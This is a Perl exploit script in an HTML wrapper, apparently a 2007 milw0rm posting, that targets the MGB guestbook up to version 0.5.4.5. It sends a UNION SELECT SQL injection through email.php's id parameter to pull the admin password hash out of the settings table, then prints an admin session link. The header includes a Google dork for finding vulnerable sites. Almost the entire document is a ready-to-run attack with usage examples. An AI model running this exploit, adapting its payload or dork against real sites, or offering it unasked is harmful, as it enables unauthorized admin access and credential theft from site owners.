<html><head><title>MGB 0.5.4.5 (email.php id variable) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
##########################################################
# MGB &lt;= 0.5.4.5 Exploit
# Vulnerability found by SlimTim10
# Created By: SlimTim10
# &lt;slimtim10@gmail.com&gt;
##########################################################
# Google dork:
# ( intext:mgb.0.5.. &amp; intext:mopzz ) | intext:mgb.0.5.4..
##########################################################


use IO::Socket::INET;

usage() unless (@ARGV == 2);

$host = $ARGV[0];
$dir = $ARGV[1];

$dir = &quot;\/$dir&quot; if ($dir !~ /^\//);
$dir = &quot;$dir\/&quot; if ($dir !~ /\/$/);
$host =~ s/http:\/\///g;

$path = $dir.'email.php?id=1%20UNION%20SELECT%20null,passwort%20FROM%20mgb_settings%20--';
$socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;,
								 PeerAddr =&gt; &quot;$host&quot;,
								 PeerPort =&gt; &quot;80&quot;)
								 || die &quot;[-]Connect Failed: could not connect to $host\n&quot;;

print &quot;[+]Connecting...\n&quot;;
print $socket &quot;GET $path HTTP/1.1\n&quot;;
print $socket &quot;Host: $host\n&quot;;
print $socket &quot;Accept: */*\n&quot;;
print $socket &quot;Connection: close\n\n&quot;;
print &quot;[+]Connected!\n&quot;;

while ($answer = &lt;$socket&gt;) {
  $answer =~ m/Email an&amp;nbsp;(.*?)&amp;nbsp;schreiben/ and $var = $1;
}

if ($var !~ /[\da-f]{32,32}/) {
	print &quot;[-]Exploit failed.&quot;;
	exit(0);
}

print &quot;[+]Admin Password: $var\n&quot;;
print &quot;[+]Admin Link: http://$host&quot;.$dir.&quot;admin.php?sid=$var\n&quot;;

sub usage {
    print &quot;\n&quot; . &quot;=|=-&quot; x 14 . &quot;=|=&quot;;
    print q(
]                                                         [
[       MGB &lt;= 0.5.4.5 Remote SQL Injection Exploit       ]
[                Tested on MGB &lt;= 0.5.4.5                 ]
[       Created by: SlimTim10 &lt;slimtim10@gmail.com&gt;       ]
]                                                         [
);
    print &quot;=|=-&quot; x 14 . &quot;=|=\n\n&quot;;
    print &quot;\tUsage: $0 [HOST] [PATH]\n&quot;;
    print &quot;\tEx: $0 www.host.com /guestbook/\n&quot;;
    print &quot;\tEx: $0 host.com mgb&quot;;
    print &quot;\n\n&quot;.&quot;`^&quot; x 29 . &quot;`\n&quot;;
    exit(0);
}

# milw0rm.com [2007-01-17]</pre></html>